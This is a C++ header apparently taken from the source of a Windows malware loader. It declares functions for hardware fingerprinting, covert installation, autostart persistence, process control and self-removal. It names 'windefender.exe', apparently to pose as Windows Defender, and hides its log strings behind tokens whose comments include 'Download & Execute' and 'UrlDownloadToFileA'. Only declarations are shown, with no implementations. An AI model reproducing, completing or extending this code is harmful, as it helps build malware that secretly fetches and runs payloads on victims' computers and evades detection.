#pragma once
#include <Windows.h>
#include <Shlobj.h>
#include <TlHelp32.h>

#include <string>

#include "Updater.h"
#include "PanelRequest.h"
#include "Settings.h"

static const char *names[] = {
	"windefender.exe"
};

#define N_NAMES (sizeof(names) / (sizeof(*names)))

enum LOGLEVEL {
	LL_ERROR,
	LL_DIAG
};

class Base
{
public:
	Base(void);
	~Base(void);

	void getHWID(std::string &hwid);
	DWORD getSerial();
	void getPCName(std::string &pcname);

	void getADPath(std::string &appdata);
	void getCurrentPath(std::string &path);
	void getInstallPath(std::string &path);
	void getExeName(std::string &exename);

	bool isInstalled();
	bool install();
	void forceInstall();
	bool forceDeleteFile(std::string &file);
	
	bool DirectoryExists(const char *DirectoryPath);
	bool ForceDirectories(const char *Path);
	void ReadHardwareId(char Id[], size_t Size);
	void GenerateRandomString(char Result[], int Len);
	unsigned int RandomRange(const int Min, const int Max);

	HANDLE findProc(DWORD pid, const char *exename);

	bool runProc(std::string &path);

	bool setAutostart();

	WORD getNVersion();
	void getSVersion(std::string &version);

	void removeOld();
	void remove();

	void diag(const char *func, int line, DWORD error, LOGLEVEL level, const char *fmt, ...);
	void terminate();

	static Base *instance();
private:
	DWORD serial;
	WORD version;
	std::string sversion, hwid, pcname, adpath, curpath, inspath, exename, insdir;
};

#define L_TERMINATE		"{[!1!]}"		// " terminate "
#define L_FORCE			"{[!2!]}"		// " forcing "
#define L_EXECUTING		"{[!3!]}"		// " Executing "
#define L_FAIL			"{[!4!]}"		// " failed "
#define L_SUCCESS		"{[!5!]}"		// " success "
#define L_EXCEPTION		"{[!6!]}"		// " Exception "
#define L_AT			"{[!7!]}"		// " at "
#define L_IMAGEBASE		"{[!8!]}"		// " Imagebase "
#define L_PID			"{[!9!]}"		// " pid "
#define L_TO			"{[!10!]}"		// " to "
#define L_INTEROPEN		"{[!11!]}"		// "InternetOpen "
#define L_INTERCONN		"{[!12!]}"		// "InternetConnect "
#define L_HTTPOREQ		"{[!13!]}"		// "HttpOpenRequest "
#define L_HTTPSREQ		"{[!14!]}"		// "HttpSendRequest "
#define L_HTTPQINFO		"{[!15!]}"		// "HttpQueryInfo "
#define L_NEW			"{[!16!]}"		// " new "
#define L_LOGGING		"{[!17!]}"		// " logging "
#define L_ON			"{[!18!]}"		// " on "
#define L_OFF			"{[!19!]}"		// " off "
#define L_DEL			"{[!20!]}"		// " delete "
#define L_FILE			"{[!21!]}"		// " file "
#define L_DLEX			"{[!22!]}"		// " Download & Execute "
#define L_NO			"{[!23!]}"		// " no "
#define L_LREQUEST		"{[!24!]}"		// " last request "
#define L_SECAGO		"{[!25!]}"		// " seconds ago "
#define L_COMMAND		"{[!26!]}"		// " command "
#define L_GETACALL		"{[!27!]}"		// " get and call "
#define L_CALLVER		"{[!28!]}"		// " called pipe and encountered version "
#define L_IAM			"{[!29!]}"		// " i am "
#define L_PIPE			"{[!30!]}"		// " pipe "
#define L_THREAD		"{[!31!]}"		// " thread "
#define L_RESTART		"{[!32!]}"		// " restarting "
#define L_HTTPREQ		"{[!33!]}"		// " httpRequest "
#define L_LEN			"{[!34!]}"		// " length "
#define L_CHKSUM		"{[!35!]}"		// " checksum "
#define L_FALLBACK		"{[!36!]}"		// " fallback "
#define L_VERIFY		"{[!37!]}"		// " verification "
#define L_SHOULD		"{[!38!]}"		// " should be "
#define L_IS			"{[!39!]}"		// " is "
#define L_CFA			"{[!40!]}"		// " CreateFileA "
#define L_WRITEF		"{[!41!]}"		// " WriteFile "
#define L_WROTE			"{[!42!]}"		// " wrote "
#define L_URLDLTF		"{[!43!]}"		// " UrlDownloadToFileA "
#define L_OPEN			"{[!44!]}"		// " open "
#define L_READ			"{[!45!]}"		// " read "
#define L_PROC			"{[!46!]}"		// " process "


#define log(level, fmt, ...) Base::instance()->diag(/*__FUNCTION__*/"", __LINE__, GetLastError(), level, fmt, __VA_ARGS__)
